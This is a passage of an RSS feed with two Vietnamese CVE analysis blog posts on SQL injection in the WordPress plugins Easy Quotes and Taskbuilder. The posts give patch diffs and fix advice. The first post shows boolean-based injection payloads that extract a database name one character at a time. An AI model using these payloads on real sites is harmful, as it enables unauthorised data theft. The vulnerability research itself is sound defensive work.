viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;h3 class=&#34;heading-element&#34; id=&#34;detect-sqli&#34;&gt;&lt;span&gt;Detect SQLi&lt;/span&gt;&#xA;  &lt;a href=&#34;#detect-sqli&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;p&gt;Ta th·ª≠ k·ªπ thu·∫≠t &lt;strong&gt;Boolean-based SQL Injection&lt;/strong&gt; ƒë·ªÉ ki·ªÉm tra xem tham s·ªë family c√≥ d·ªÖ b·ªã ch√®n l·ªánh SQL hay kh√¥ng.&lt;/p&gt;&#xA;&lt;p&gt;&lt;strong&gt;True request&lt;/strong&gt;:&#xA;&lt;figure&gt;&lt;img src=&#34;http://localhost:1313/posts/2025-09-23-cve-2025-26943/true_req.png&#34;&#xA;    alt=&#34;True request&#34;&gt;&lt;figcaption&gt;&#xA;      &lt;p&gt;True request&lt;/p&gt;&#xA;    &lt;/figcaption&gt;&#xA;&lt;/figure&gt;&#xA;&lt;/p&gt;&#xA;&lt;p&gt;Khi ƒë√≥, c√¢u query th·ª±c thi s·∫Ω tr·ªü th√†nh:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;SELECT * FROM wp_easy-quotes-families WHERE family=&amp;#39;Roboto&amp;#39;&amp;#43;AND&amp;#43;&amp;#39;1&amp;#39;=&amp;#39;1&amp;#39;&amp;#34;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;ƒêi·ªÅu ki·ªán &lt;code&gt;AND &#39;1&#39;=&#39;1&#39;&lt;/code&gt; lu√¥n ƒë√∫ng =&amp;gt; query h·ª£p l·ªá, tr·∫£ v·ªÅ d·ªØ li·ªáu b√¨nh th∆∞·ªùng.&lt;/p&gt;&#xA;&lt;p&gt;&lt;strong&gt;False request&lt;/strong&gt;:&#xA;&lt;figure&gt;&lt;img src=&#34;http://localhost:1313/posts/2025-09-23-cve-2025-26943/false_req.png&#34;&#xA;    alt=&#34;False request&#34;&gt;&lt;figcaption&gt;&#xA;      &lt;p&gt;False request&lt;/p&gt;&#xA;    &lt;/figcaption&gt;&#xA;&lt;/figure&gt;&#xA;&lt;/p&gt;&#xA;&lt;p&gt;Khi ƒë√≥, c√¢u query th·ª±c thi s·∫Ω tr·ªü th√†nh:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;SELECT * FROM wp_easy-quotes-families WHERE family=&amp;#39;Roboto&amp;#39;&amp;#43;AND&amp;#43;&amp;#39;1&amp;#39;=&amp;#39;2&amp;#39;&amp;#34;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;ƒêi·ªÅu ki·ªán &lt;code&gt;AND &#39;1&#39;=&#39;2&#39;&lt;/code&gt; lu√¥n sai =&amp;gt; query kh√¥ng kh·ªõp =&amp;gt; tr·∫£ v·ªÅ &lt;code&gt;[]&lt;/code&gt;.&lt;/p&gt;&#xA;&lt;h3 class=&#34;heading-element&#34; id=&#34;get-first-letter-of-database-name&#34;&gt;&lt;span&gt;Get First Letter of Database Name&lt;/span&gt;&#xA;  &lt;a href=&#34;#get-first-letter-of-database-name&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;p&gt;ƒêi·ªÅu ki·ªán ti√™n quy·∫øt ƒë·ªÉ &lt;strong&gt;dump ƒë∆∞·ª£c h·∫øt data&lt;/strong&gt; l√† ph·∫£i dump ƒë∆∞·ª£c 1 k√Ω t·ª± b·∫•t k·ª≥ c·ªßa t√™n database, n·∫øu l·∫•y ƒë∆∞·ª£c th√¨ to√†n b·ªô data ƒë·ªÅu dump ƒë∆∞·ª£c.&lt;/p&gt;&#xA;&lt;blockquote&gt;&#xA;&lt;p&gt;Database name ƒë∆∞·ª£c t√¥i ƒë·∫∑t t√™n l√† &lt;strong&gt;wordpress&lt;/strong&gt; n√™n k√≠ t·ª± ƒë·∫ßu ti√™n l√† &lt;code&gt;w&lt;/code&gt;&lt;/p&gt;&#xA;&lt;/blockquote&gt;&#xA;&lt;figure&gt;&lt;img src=&#34;http://localhost:1313/posts/2025-09-23-cve-2025-26943/first_letter.png&#34;&#xA;    alt=&#34;First letter&#34;&gt;&lt;figcaption&gt;&#xA;      &lt;p&gt;First letter&lt;/p&gt;&#xA;    &lt;/figcaption&gt;&#xA;&lt;/figure&gt;&#xA;&#xA;&lt;p&gt;Response tr·∫£ v·ªÅ d·ªØ li·ªáu b√¨nh th∆∞·ªùng =&amp;gt; k√≠ t·ª± ƒë·∫ßu ti√™n l√† &lt;code&gt;w&lt;/code&gt;&lt;/p&gt;&#xA;&lt;p&gt;Khi ƒë√≥, c√¢u query th·ª±c thi s·∫Ω tr·ªü th√†nh:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;SELECT * FROM wp_easy-quotes-families WHERE family=&amp;#39;Roboto&amp;#39;&amp;#43;AND&amp;#43;SUBSTRING(DATABASE(),1,1)=&amp;#39;w&amp;#39;&amp;#34;&lt;/code&gt;&lt;/pre&gt;&lt;h2 class=&#34;heading-element&#34; id=&#34;conclusion&#34;&gt;&lt;span&gt;Conclusion&lt;/span&gt;&#xA;  &lt;a href=&#34;#conclusion&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;L·ªó h·ªïng &lt;strong&gt;CVE-2025-26943&lt;/strong&gt; trong plugin WordPress &lt;strong&gt;Easy Quotes&lt;/strong&gt; tr∆∞·ªõc phi√™n b·∫£n &lt;strong&gt;1.2.3&lt;/strong&gt; xu·∫•t ph√°t t·ª´ vi·ªác kh√¥ng s·ª≠ d·ª•ng c∆° ch·∫ø chu·∫©n b·ªã truy v·∫•n &lt;code&gt;($wpdb-&amp;gt;prepare)&lt;/code&gt; m√† truy·ªÅn tr·ª±c ti·∫øp d·ªØ li·ªáu t·ª´ ng∆∞·ªùi d√πng v√†o c√¢u l·ªánh SQL d·∫´n ƒë·∫øn l·ªó h·ªïng SQL Injection.&lt;/p&gt;&#xA;&lt;p&gt;B·∫£n v√° ch√≠nh th·ª©c ƒë√£ thay th·∫ø vi·ªác n·ªëi chu·ªói b·∫±ng c√°ch d√πng &lt;code&gt;$wpdb-&amp;gt;prepare&lt;/code&gt;, gi√∫p ƒë·∫£m b·∫£o d·ªØ li·ªáu ƒë·∫ßu v√†o ƒë∆∞·ª£c ki·ªÉm so√°t v√† an to√†n h∆°n.&lt;/p&gt;&#xA;&lt;p&gt;&lt;strong&gt;Key takeaways&lt;/strong&gt;:&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;Lu√¥n s·ª≠ d·ª•ng &lt;code&gt;$wpdb-&amp;gt;prepare()&lt;/code&gt; khi l√†m vi·ªác v·ªõi database trong WordPress ƒë·ªÉ tr√°nh SQL Injection.&lt;/li&gt;&#xA;&lt;li&gt;Th∆∞·ªùng xuy√™n c·∫≠p nh·∫≠t plugin v√† ki·ªÉm tra b·∫£o m·∫≠t ƒë·ªÉ tr√°nh tr·ªü th√†nh m·ª•c ti√™u t·∫•n c√¥ng.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;references&#34;&gt;&lt;span&gt;References&lt;/span&gt;&#xA;  &lt;a href=&#34;#references&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;&lt;a href=&#34;https://portswigger.net/web-security/sql-injection/cheat-sheet&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;SQL Injection cheat sheet - PortSwigger&lt;/a&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;a href=&#34;https://patchstack.com/database/wordpress/plugin/easy-quotes/vulnerability/wordpress-easy-quotes-plugin-1-2-2-sql-injection-vulnerability&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress Easy Quotes Plugin &amp;lt;= 1.2.2 is vulnerable to SQL Injection&lt;/a&gt;&lt;/p&gt;</description>
    </item>
    <item>
      <title>CVE-2025-39569 Analysis &amp; POC</title>
      <link>http://localhost:1313/vi/posts/2025-09-22-cve-2025-39569/</link>
      <pubDate>Mon, 22 Sep 2025 18:56:00 +0700</pubDate><author>w41bu1@gmail.com (Bui Van Y)</author>
      <guid>http://localhost:1313/vi/posts/2025-09-22-cve-2025-39569/</guid>
      <category domain="http://localhost:1313/vi/categories/cve-analysis/">CVE Analysis</category>
      <description>&lt;img src=&#34;http://localhost:1313/posts/2025-09-22-cve-2025-39569/app.png&#34; alt=&#34;featured image&#34; referrerpolicy=&#34;no-referrer&#34;&gt;&lt;p&gt;L·ªó h·ªïng x·∫£y ra tr√™n plugin &lt;strong&gt;Taskbuilder&lt;/strong&gt; c·ªßa WordPress tr∆∞·ªõc phi√™n b·∫£n &lt;strong&gt;4.0.2&lt;/strong&gt;. ƒêi·ªÅu n√†y c√≥ th·ªÉ cho ph√©p k·∫ª t·∫•n c√¥ng tr·ª±c ti·∫øp t∆∞∆°ng t√°c v·ªõi c∆° s·ªü d·ªØ li·ªáu c·ªßa b·∫°n, bao g·ªìm kh√¥ng gi·ªõi h·∫°n ·ªü vi·ªác ƒë√°nh c·∫Øp th√¥ng tin.&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVE ID&lt;/strong&gt;: &lt;a href=&#34;https://www.cve.org/CVERecord?id=CVE-2025-39569&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;CVE-2025-39569&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Product&lt;/strong&gt;: &lt;a href=&#34;https://wordpress.org/plugins/taskbuilder/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress Hostel Plugin&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Vulnerability Type&lt;/strong&gt;: SQL Injection&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Affected Versions&lt;/strong&gt;: &amp;lt; 4.0.2&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVSS severity&lt;/strong&gt;: High (8.5)&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Required Privilege&lt;/strong&gt;: Subscriber&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;requirements&#34;&gt;&lt;span&gt;Requirements&lt;/span&gt;&#xA;  &lt;a href=&#34;#requirements&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;Local WordPress &amp;amp; Debugging&lt;/strong&gt;: &lt;a href=&#34;https://w41bu1.github.io/2025-08-21-wordpress-local-and-debugging/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Local WordPress and Debugging&lt;/a&gt;.&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Taskbuilder Plugin&lt;/strong&gt;:  v4.0.1(vul) v√† v4.0.2(fix)&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;diff tool&lt;/strong&gt;: &lt;strong&gt;meld&lt;/strong&gt; ho·∫∑c b·∫•t c·ª© tool n√†o c√≥ th·ªÉ compare ƒë·ªÉ th·∫•y ƒë∆∞·ª£c s·ª± kh√°c bi·ªát gi·ªØa 2 version&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;analysis&#34;&gt;&lt;span&gt;Analysis&lt;/span&gt;&#xA;  &lt;a href=&#34;#analysis&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;·ª®ng d·ª•ng ƒë√£ &lt;strong&gt;x·ª≠ l√Ω d·ªØ li·ªáu ƒë·∫ßu v√†o&lt;/strong&gt; tr∆∞·ªõc khi ƒë∆∞a v√†o c√¢u SQL. Tuy nhi√™n, trong qu√° tr√¨nh x√¢y d·ª±ng truy v·∫•n, gi√° tr·ªã n√†y ƒë∆∞·ª£c ch√®n tr·ª±c ti·∫øp m√† kh√¥ng ƒë∆∞·ª£c bao trong d·∫•u nh√°y ƒë∆°n &lt;code&gt;&#39;...&#39;&lt;/code&gt;. ƒêi·ªÅu ƒë√≥ khi·∫øn k·∫ª t·∫•n c√¥ng c√≥ th·ªÉ ch√®n th√™m c√°c th√†nh ph·∫ßn c√∫ ph√°p SQL h·ª£p l·ªá (nh∆∞ &lt;code&gt;OR&lt;/code&gt;, &lt;code&gt;AND&lt;/code&gt;,&lt;code&gt;...&lt;/code&gt;) v√†o truy v·∫•n, d·∫´n ƒë·∫øn l·ªó h·ªïng SQL Injection.&lt;/p&gt;&#xA;&lt;h3 class=&#34;heading-element&#34; id=&#34;patch-diff&#34;&gt;&lt;span&gt;Patch Diff&lt;/span&gt;&#xA;  &lt;a href=&#34;#patch-diff&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;p&gt;D√πng diff tool b·∫•t k√¨ ƒë·ªÉ so s√°nh s·ª± kh√°c bi·ªát gi·ªØa b·∫£n l·ªói v√† b·∫£n v√°.&#xA;C√≥ s·ª± kh√°c bi·ªát r√µ ·ªü file &lt;strong&gt;includes/admin/projects/get_users.php&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;p&gt;Trong phi√™n b·∫£n &lt;strong&gt;v4.0.1&lt;/strong&gt;, bi·∫øn &lt;code&gt;$proj_id&lt;/code&gt; sau khi escape ƒë∆∞·ª£c ƒë∆∞a th·∫≥ng v√†o c√¢u truy v·∫•n m√† kh√¥ng c√≥ d·∫•u nh√°y ƒë∆°n bao quanh:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;$proj_id = esc_sql($proj_id);&#xA;$project = $wpdb-&amp;gt;get_row( &amp;#34;SELECT * FROM {$wpdb-&amp;gt;prefix}wppm_project where id = $proj_id&amp;#34; );&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;·ªû b·∫£n &lt;strong&gt;v4.0.2&lt;/strong&gt;, truy v·∫•n ƒë√£ ƒë∆∞·ª£c ƒëi·ªÅu ch·ªânh b·∫±ng c√°ch ƒë·∫∑t &lt;code&gt;$proj_id&lt;/code&gt; trong d·∫•u nh√°y ƒë∆°n sau khi escape:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;$proj_id = esc_sql($proj_id);&#xA;$project = $wpdb-&amp;gt;get_row( &amp;#34;SELECT * FROM {$wpdb-&amp;gt;prefix}wppm_project where id = &amp;#39;$proj_id&amp;#39;&amp;#34; );&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;B·∫£n v√° n√†y ƒë·∫£m b·∫£o r·∫±ng gi√° tr·ªã &lt;code&gt;$proj_id&lt;/code&gt; sau khi escape ƒë∆∞·ª£c coi l√† &lt;strong&gt;m·ªôt chu·ªói literal&lt;/strong&gt;, kh√¥ng th·ªÉ tho√°t ra kh·ªèi d·∫•u nh√°y ƒë∆°n ƒë·ªÉ ch√®n th√™m c√∫ ph√°p SQL, qua ƒë√≥ ngƒÉn ch·∫∑n t·∫•n c√¥ng SQL Injection.&lt;/p&gt;&#xA;&lt;figure&gt;&lt;img src=&#34;http://localhost:1313/posts/2025-09-22-cve-2025-39569/patch_diff.png&#34;&#xA;    alt=&#34;patch diff&#34;&gt;&lt;figcaption&gt;&#xA;      &lt;p&gt;Patch diff&lt;/p&gt;&#xA;    &lt;/figcaption&gt;&#xA;&lt;/figure&gt;&#xA;&#xA;&lt;h3 class=&#34;heading-element&#34; id=&#34;how-it-work&#34;&gt;&lt;span&gt;How it work?&lt;/span&gt;&#xA;  &lt;a href=&#34;#how-it-work&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;p&gt;&lt;strong&gt;File architecture&lt;/strong&gt;:&lt;/p&gt;&#xA;&lt;p&gt;C·∫•u tr√∫c chung c·ªßa file hi·ªán t·∫°i&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;$proj_id  = esc_sql($proj_id);&#xA;$project  = $wpdb-&amp;gt;get_row(&amp;#34;SELECT * FROM {$wpdb-&amp;gt;prefix}wppm_project WHERE id = $proj_id&amp;#34;);&#xA;&#xA;// B·∫Øt ƒë·∫ßu buffer ƒë·ªÉ t·∫°o n·ªôi dung ch√≠nh (body) c·ªßa modal&#xA;ob_start();&#xA;// ... render HTML danh s√°ch users&#xA;$body = ob_get_clean();&#xA;&#xA;// B·∫Øt ƒë·∫ßu buffer ƒë·ªÉ t·∫°o ph·∫ßn footer c·ªßa modal&#xA;ob_start();&#xA;// ... render HTML c√°c n√∫t thao t√°c (Close, Save)&#xA;$footer = ob_get_clean();&#xA;&#xA;// Tr·∫£ d·ªØ li·ªáu JSON ƒë·ªÉ frontend hi·ªÉn th·ªã modal&#xA;echo json_encode([&#xA;    &amp;#39;body&amp;#39;   =&amp;gt; $body,&#xA;    &amp;#39;footer&amp;#39; =&amp;gt; $footer,&#xA;]);&lt;/code&gt;&lt;/pre&gt;&lt;ul&gt;&#xA;&lt;li&gt;&lt;code&gt;$proj_id&lt;/code&gt; / &lt;code&gt;$project&lt;/code&gt;: L·∫•y d·ªØ li·ªáu project t·ª´ database.&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;ob_start()&lt;/code&gt; / &lt;code&gt;ob_get_clean()&lt;/code&gt;: Ghi HTML ra buffer thay v√¨ xu·∫•t tr·ª±c ti·∫øp, gi√∫p gom n·ªôi dung v√†o bi·∫øn.&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;$body&lt;/code&gt; / &lt;code&gt;$footer&lt;/code&gt;: Ch·ª©a n·ªôi dung HTML ƒë·ªông c·ªßa modal.&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;json_encode()&lt;/code&gt;: Tr·∫£ JSON cho client, c√≥ kh·∫£ nƒÉng ƒë∆∞·ª£c s·ª≠ d·ª•ng trong Ajax ƒë·ªÉ hi·ªÉn th·ªã modal m√† kh√¥ng c·∫ßn refresh trang.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;p&gt;File n·∫±m trong th∆∞ m·ª•c &lt;code&gt;includes&lt;/code&gt; cho th·∫•y r·∫±ng n√≥ s·∫Ω ƒë∆∞·ª£c g·ªçi ·ªü 1 ch·ª©c nƒÉng n√†o ƒë√≥ ·ªü n∆°i kh√°c. ƒê·ªÉ bi·∫øt ch·ª©c nƒÉng n√†o s·ª≠ d·ª•ng n√≥, ta t√¨m ki·∫øm v·ªõi t·ª´ kh√≥a &lt;code&gt;get_users.php&lt;/code&gt; trong th∆∞ m·ª•c ch·ª©a plugin.&lt;/p&gt;&#xA;&lt;figure&gt;&lt;img src=&#34;http://localhost:1313/posts/2025-09-22-cve-2025-39569/search_get_users.png&#34;&#xA;    alt=&#34;search get users&#34;&gt;&lt;figcaption&gt;&#xA;      &lt;p&gt;Search users&lt;/p&gt;&#xA;    &lt;/figcaption&gt;&#xA;&lt;/figure&gt;&#xA;&#xA;&lt;p&gt;üëâ N√≥ ƒë∆∞·ª£c include trong h√†m &lt;code&gt;wppm_get_users()&lt;/code&gt; c·ªßa class &lt;code&gt;WPPM_Admin&lt;/code&gt; trong file &lt;strong&gt;class-wppm-admin.php&lt;/strong&gt;.&#xA;&lt;code&gt;wppm_get_users()&lt;/code&gt; l√† &lt;strong&gt;callback&lt;/strong&gt; c·ªßa &lt;strong&gt;action hook trong 